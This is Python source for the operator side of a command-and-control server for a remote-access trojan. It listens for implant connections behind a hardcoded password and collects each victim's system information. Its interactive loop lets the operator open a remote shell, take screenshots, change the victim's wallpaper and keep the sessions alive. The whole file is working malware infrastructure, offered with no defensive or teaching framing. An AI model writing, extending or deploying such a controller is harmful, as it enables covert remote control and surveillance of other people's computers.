import socket
import sys, os, time
import json
from lib.helper import *
from lib.debug import Debug
from lib.dmos import Dmos
from termcolor import colored, cprint
from hashlib import md5

class C2():
    def __init__(self, ANODE, APORT, multi_handler):
        self.multi_handler = multi_handler
        self.ANODE = ANODE
        self.APORT = APORT
        self.PASS  = "pontifex"
        self.interactive = False
        self.keepAliveSleepInterval = 5
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    @safe_exec
    def listener(self):
        self.s.bind((self.ANODE, self.APORT))
        self.s.listen(5)

    @safe_exec
    def accept_conn(self):
        conn, address = self.s.accept()
        if conn.recv(36).decode() == self.PASS:
            intel = conn.recv(1024).decode()

            intel = json.loads(intel)
                #print(intel)
            return Dmos(intel["basic"], intel["sysinfo"], address[0], conn)

    @safe_exec
    def interact(self, dmos):
        conn = dmos.conn
        while 1:
            command = input(colored("[{}@{}]>> ".format(dmos.USERNAME, dmos.GLOBAL), 'cyan', attrs=['bold']))
            if command == "free":
                dmos.free_dmos()
                terminate(conn, self.multi_handler.dmoss, dmos, "gracefully")
                break
            elif command == "shell":
                dmos.interactive_shell()
            elif command == "sysinfo":
                dmos.system_info()
            elif command == "fat":
                dmos.send(command.encode())
            elif command == "screenshot":
                dmos.screenshot()
                Debug.tprint("sc downloaded")
            elif command[:9] == "bgchange ":
                a, path = command.split(' ')
                dmos.background_changer(path)
            elif command == "clear":
                os.system("clear")
            elif command == "b":
                self.multi_handler.cmdline()
                pass
    @safe_exec
    def keepAlive(self):
        while 1:
            time.sleep(self.keepAliveSleepInterval)
            for d, hash in enumerate(self.multi_handler.dmoss.copy()):
                try:
                    self.multi_handler.dmoss[hash].conn.send(b" ")
                except:
                    self.multi_handler.dmoss[hash].conn.close()
                    Debug.tprint("Connection with dmos {} has been broken".format(self.multi_handler.dmoss[hash].md5_hash), thread=True)
                    self.multi_handler.dmoss.pop(hash, None)
